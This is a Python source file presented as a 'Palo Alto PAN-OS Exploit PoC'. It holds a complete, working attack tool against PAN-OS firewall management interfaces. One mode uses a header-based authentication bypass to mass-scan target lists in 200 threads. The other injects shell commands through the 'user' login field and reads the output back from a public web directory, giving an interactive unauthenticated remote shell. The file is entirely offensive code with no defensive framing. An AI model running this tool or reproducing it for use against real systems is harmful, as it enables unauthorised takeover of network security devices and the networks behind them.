import argparse
import concurrent.futures
import os
import random
import re
import requests
import string
import sys
from typing import Dict, List, Optional
from urllib3.exceptions import InsecureRequestWarning

# Disable SSL warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

class Colors:
    CYAN = '\033[96m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    RESET = '\033[0m'

    @staticmethod
    def cyan(text: str) -> str:
        return f"{Colors.CYAN}{text}{Colors.RESET}"

    @staticmethod
    def red(text: str) -> str:
        return f"{Colors.RED}{text}{Colors.RESET}"

    @staticmethod
    def green(text: str) -> str:
        return f"{Colors.GREEN}{text}{Colors.RESET}"

class ExploitClient:
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers = {
            'User-Agent': 'Warm Apple Pie',
            'X-PAN-AUTHCHECK': 'off'
        }
        self.session.timeout = 10

    def new_request(self, method: str, url: str, payload: Optional[str] = None) -> requests.Request:
        headers = {}
        if payload:
            headers['Content-Type'] = 'application/x-www-form-urlencoded'

        return requests.Request(
            method=method,
            url=url,
            data=payload,
            headers=headers
        )

    def send_request(self, request: requests.Request) -> requests.Response:
        prepped = self.session.prepare_request(request)
        return self.session.send(prepped)

def print_over_bar(msg: str):
    """Print a message that overwrites the current line."""
    sys.stdout.write('\r\033[K' + msg + '\n')
    sys.stdout.flush()

def save_to_file(data: str, output_file: str):
    """Save data to the specified output file."""
    with open(output_file, 'a') as f:
        f.write(data)

def scan_mode_func(url: str, total_urls: int, current: int, output_file: str, client: ExploitClient):
    """Function to handle scanning mode for multiple URLs."""
    try:
        full_url = f"{url}/php/ztp_gate.php/.js.map"
        req = client.new_request("GET", full_url)
        resp = client.send_request(req)

        if resp.status_code == 200 and "Zero Touch Provisioning" in resp.text:
            result = f"{url} - Auth Bypass successful\n"
            save_to_file(result, output_file)
            print_over_bar(Colors.green(f"[+] {result.strip()}"))
    except Exception as e:
        print_over_bar(Colors.red(f"[-] Error scanning {url}: {str(e)}"))
    finally:
        print(f"\rProgress: [{current}/{total_urls}]", end='')

def exploit_mode_func(url: str, client: ExploitClient):
    """Function to handle exploit mode for a single URL."""
    output_name = f"{random.randint(0, 10000)}.txt"

    while True:
        try:
            cmd = input(Colors.cyan("# ")).strip()

            if cmd.lower() == 'exit':
                print(Colors.green("[+] Exiting interactive shell."))
                break

            payload = f"user=`echo $({cmd}) > /var/appweb/htdocs/unauth/{output_name}`&userRole=superuser&remoteHost=&vsys=vsys1"
            full_url = f"{url}/php/utils/createRemoteAppwebSession.php/peppa.js.map"

            # Send command execution request
            req = client.new_request("POST", full_url, payload)
            resp = client.send_request(req)

            print(Colors.green(f"[+] {url} - Response Status: {resp.status_code}"))

            # Extract PHPSESSID if present
            phpsessid_match = re.search(r'@start@PHPSESSID=([a-zA-Z0-9]+)@end@', resp.text)
            if phpsessid_match:
                phpsessid = phpsessid_match.group(1)
                client.session.cookies.set('PHPSESSID', phpsessid)

                # Try to authenticate
                index_url = f"{url}/index.php/.js.map"
                req = client.new_request("GET", index_url)
                client.send_request(req)

            # Get command output
            output_url = f"{url}/unauth/{output_name}"
            req = client.new_request("GET", output_url)
            output_resp = client.send_request(req)

            if output_resp.status_code == 200:
                print(Colors.green(f"[+] {url} - Command Output:"))
                print(output_resp.text)
            else:
                print(Colors.red(f"[-] {url} - Failed to retrieve command output (Status: {output_resp.status_code})"))

        except Exception as e:
            print(Colors.red(f"[-] Error: {str(e)}"))

def main():
    parser = argparse.ArgumentParser(description=Colors.cyan("Palo Alto PAN-OS Exploit PoC"))
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-u', '--url', help='Target base URL (e.g., http://example.com)')
    group.add_argument('-f', '--file', help='File with multiple URLs')
    parser.add_argument('-t', '--threads', type=int, default=200, help='Concurrent threads')
    parser.add_argument('-o', '--output', default='output.txt', help='Output file for scan results')

    args = parser.parse_args()

    client = ExploitClient()

    if args.file:
        try:
            with open(args.file) as f:
                urls = [line.strip() for line in f if line.strip()]

            print(Colors.green(f"[+] Loaded {len(urls)} URLs from file"))

            with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
                futures = []
                for i, url in enumerate(urls, 1):
                    futures.append(
                        executor.submit(
                            scan_mode_func,
                            url,
                            len(urls),
                            i,
                            args.output,
                            client
                        )
                    )
                concurrent.futures.wait(futures)

            print(Colors.green(f"\n[+] Results saved to {args.output}"))

        except Exception as e:
            print(Colors.red(f"[-] Error: {str(e)}"))
            sys.exit(1)

    else:
        exploit_mode_func(args.url, client)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Colors.red("\n[-] Operation cancelled by user"))
        sys.exit(0)